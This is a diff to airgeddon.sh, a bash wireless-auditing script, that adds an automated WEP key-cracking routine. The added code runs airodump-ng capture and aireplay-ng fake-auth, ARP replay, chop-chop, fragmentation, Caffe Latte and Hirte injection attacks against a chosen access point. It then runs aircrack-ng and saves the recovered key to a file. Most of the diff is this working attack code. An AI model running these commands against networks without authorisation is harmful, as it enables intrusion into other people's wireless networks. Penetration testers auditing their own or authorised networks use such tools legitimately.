@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Date.........: 20170312
+#Date.........: 20170319
 #Version......: 7.0
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
@@ -120,6 +120,11 @@ escaped_pending_of_translation="\[PoT\]"
 standard_resolution="1024x768"
 curl_404_error="404: Not Found"
 language_strings_file="language_strings.sh"
+broadcast_mac="FF:FF:FF:FF:FF:FF"
+
+#WEP vars
+wep_data="wepdata"
+wepdir="wep/"
 
 #WPS vars
 minimum_reaver_pixiewps_version="1.5.2"
@@ -1560,39 +1565,101 @@ function exec_wep_allinone_attack() {
 	language_strings "${language}" 115 "read"
 
 	tmpfiles_toclean=1
-	rm -rf "${tmpdir}wepdata" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+	rm -rf -R "${tmpdir}${wepdir}" > /dev/null 2>&1
 
 	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)
 	${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+	mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
+	cd "${tmpdir}${wepdir}" > /dev/null 2>&1
 
 	wep_processes=()
 
-	#TODO almost all attacks pending
 	recalculate_windows_sizes
-	xterm -hold -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 30 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Custom Packet Replying" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Injection" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg brown -geometry "${g5_left4}" -T "Chop-Chop Attack" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg blue -geometry "${g5_left5}" -T "Fragmentation Attack" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg pink -geometry "${g5_left6}" -T "Caffe Latte Attack" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg grey -geometry "${g5_left7}" -T "Hirte Attack" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} -w \"${tmpdir}wepdata\" ${interface}" > /dev/null 2>&1 &
-	wep_processes+=($!)
-	xterm -hold -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "sleep 100" > /dev/null 2>&1 &
-	wep_processes+=($!)
+	xterm -hold -bg black -fg white -geometry "${g5_topright_window}" -T "Capturing WEP Data" -e "airodump-ng -d ${bssid} -c ${channel} -w \"${tmpdir}${wep_data}\" ${interface}" > /dev/null 2>&1 &
+	wep_capture_pid=$!
+	wep_processes+=(${wep_capture_pid})
 
-	echo
-	language_strings "${language}" 428 "yellow"
-	language_strings "${language}" 115 "read"
+	local to_be_launched_only_once=0
+	wep_fakeauth_pid=""
+	wep_aircrack_launched=0
+	current_ivs=0
+	while true; do
+
+		wep_capture_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_capture_pid} 2> /dev/null)
+		wep_fakeauth_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_fakeauth_pid} 2> /dev/null)
+
+		if [[ -n ${wep_capture_pid_alive} ]] && [[ -z ${wep_fakeauth_pid_alive} ]]; then
+			recalculate_windows_sizes
+			xterm -bg black -fg green -geometry "${g5_left1}" -T "Fake Auth" -e "aireplay-ng -1 3 -o 1 -q 10 -e \"${essid}\" -a ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_fakeauth_pid=$!
+			wep_processes+=(${wep_fakeauth_pid})
+			sleep 2
+		fi
+
+		if [ ${to_be_launched_only_once} -eq 0 ]; then
+			to_be_launched_only_once=1
+
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg yellow -geometry "${g5_left2}" -T "Arp Broadcast Injection" -e "aireplay-ng -2 -p 0841 -F -c ${broadcast_mac} -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg red -geometry "${g5_left3}" -T "Arp Request Replay" -e "aireplay-ng -3 -x 1024 -g 1000000 -b ${bssid} -h ${current_mac} -i ${interface} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+
+			wep_chopchop_phase=1
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg brown -geometry "${g5_left4}" -T "Chop-Chop Attack (${wep_chopchop_phase}/3)" -e "yes | aireplay-ng -4 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+			#TODO phase 2 and 3 of Chop-Chop attack
+
+			wep_fragmentation_phase=1
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg blue -geometry "${g5_left5}" -T "Fragmentation Attack (${wep_fragmentation_phase}/3)" -e "yes | aireplay-ng -5 -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+			#TODO phase 2 and 3 of Fragmentation attack
+
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg pink -geometry "${g5_left6}" -T "Caffe Latte Attack" -e "aireplay-ng -6 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+
+			recalculate_windows_sizes
+			xterm -hold -bg black -fg grey -geometry "${g5_left7}" -T "Hirte Attack" -e "aireplay-ng -7 -F -D -b ${bssid} -h ${current_mac} ${interface}" > /dev/null 2>&1 &
+			wep_processes+=($!)
+		fi
+
+		current_ivs=$(grep "WEP" ${tmpdir}${wep_data}*.csv --exclude=*kismet* | head -n 1 | awk '{print $11}' FS=',' | sed 's/ //g')
+		if [[ ${current_ivs} -ge 5000 ]] && [[ ${wep_aircrack_launched} -eq 0 ]]; then
+			wep_aircrack_launched=1
+			recalculate_windows_sizes
+			xterm -bg black -fg yellow -geometry "${g5_bottomright_window}" -T "Decrypting WEP Key" -e "aircrack-ng \"${tmpdir}${wep_data}\"*.cap -l \"${tmpdir}${wepdir}wepkey.txt\"" > /dev/null 2>&1 &
+			wep_aircrack_pid=$!
+			wep_processes+=(${wep_aircrack_pid})
+		fi
+
+		wep_aircrack_pid_alive=$(ps uax | awk '{print $2}' | grep ${wep_aircrack_pid} 2> /dev/null)
+		if [[ -z ${wep_aircrack_pid_alive} ]] && [[ ${wep_aircrack_launched} -eq 1 ]]; then
+			break
+		fi
+	done
 
 	kill_wep_windows
+
+	if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
+		wep_hex_key=$(cat "${tmpdir}${wepdir}wepkey.txt")
+		wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9]{2}')
+
+		echo
+		language_strings "${language}" 162 "yellow"
+		echo
+		language_strings "${language}" 429 "blue"
+
+		ask_yesno 235
+		if [ ${yesno} = "y" ]; then
+			manage_wep_pot
+		fi
+	fi
 }
 
 #Execute wps custom pin bully attack
@@ -2367,7 +2434,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}wps"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_attack_script_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${wps_out_file}" > /dev/null 2>&1
-	rm -rf "${tmpdir}wepdata" > /dev/null 2>&1
+	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
+	rm -rf -R "${tmpdir}${wepdir}" > /dev/null 2>&1
 }
 
 #Manage cleaning firewall rules and restore orginal routing state
@@ -3599,6 +3667,44 @@ function manage_bettercap_log() {
 			read_path "bettercaplog"
 		done
 	fi
+}
+
+#Check if the wep password was captured and manage to save it on a file
+function manage_wep_pot() {
+
+	debug_print
+
+	wep_potpath=$(env | grep ^HOME | awk -F = '{print $2}')
+	lastcharwep_potpath=${wep_potpath: -1}
+	if [ "${lastcharwep_potpath}" != "/" ]; then
+		wep_potpath="${wep_potpath}/"
+	fi
+	weppot_filename="wep_captured_key-${essid}.txt"
+	wep_potpath="${wep_potpath}${weppot_filename}"
+
+	validpath=1
+	while [[ "${validpath}" != "0" ]]; do
+		read_path "weppot"
+	done
+
+	echo "" > "${weppotenteredpath}"
+	{
+	date +%Y-%m-%d
+	echo -e "${wep_texts[${language},1]}"
+	echo ""
+	echo -e "BSSID: ${bssid}"
+	echo -e "${wep_texts[${language},2]}: ${channel}"
+	echo -e "ESSID: ${essid}"
+	echo ""
+	echo "---------------"
+	echo ""
+	echo -e "ASCII: ${wep_ascii_key}"
+	echo -e "${wep_texts[${language},3]}: ${wep_hex_key}"
+	} >> "${weppotenteredpath}"
+
+	echo
+	language_strings "${language}" 431 "blue"
+	language_strings "${language}" 115 "read"
 }
 
 #Check if the passwords were captured using the captive portal Evil Twin attack and manage to save them on a file
@@ -6030,6 +6136,10 @@ function validate_path() {
 				et_handshake="${pathname}${standardhandshake_filename}"
 				suggested_filename="${standardhandshake_filename}"
 			;;
+			"weppot")
+				suggested_filename="${weppot_filename}"
+				weppotenteredpath+="${weppot_filename}"
+			;;
 		esac
 
 		echo
@@ -6147,6 +6257,14 @@ function read_path() {
 				et_captive_portal_logpath="${default_et_captive_portal_logpath}"
 			fi
 			validate_path "${et_captive_portal_logpath}" "${1}"
+		;;
+		"weppot")
+			language_strings "${language}" 430 "green"
+			read_and_clean_path "weppotenteredpath"
+			if [ -z "${weppotenteredpath}" ]; then
+				weppotenteredpath="${wep_potpath}"
+			fi
+			validate_path "${weppotenteredpath}" "${1}"
 		;;
 	esac
 
